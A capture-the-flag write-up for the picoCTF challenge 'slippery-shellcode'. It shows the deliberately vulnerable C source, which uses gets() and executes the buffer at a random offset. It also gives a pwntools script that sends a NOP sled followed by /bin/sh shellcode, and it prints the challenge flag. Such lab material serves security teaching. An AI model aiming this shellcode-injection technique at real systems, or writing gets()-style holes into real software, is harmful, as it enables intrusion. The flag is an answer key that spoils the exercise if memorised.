# slippery-shellcode - Points: 200
<b>Description : </b>This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8 on the shell server. Source.<br>
<b>Hints : </b>
# Solved
So we can see there is some vulnerability in code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```
But sadly, we need to bypass 
```cpp
int offset = (rand() % 256) + 1;
```
to place our payload, to do this we need set script code into <b>NOP</b> or <b>0x90</b>, this the script i use
```python
from pwn import *;
payload = '\x90' * 256 + asm(shellcraft.i386.linux.sh());
p = process('./vuln');
p.sendline(payload);
p.interactive();
```
Execute! and read the flag <b>cat flag.txt</b><br>
Flag : <b>picoCTF{sl1pp3ry_sh311c0d3_de21cb07}</b>
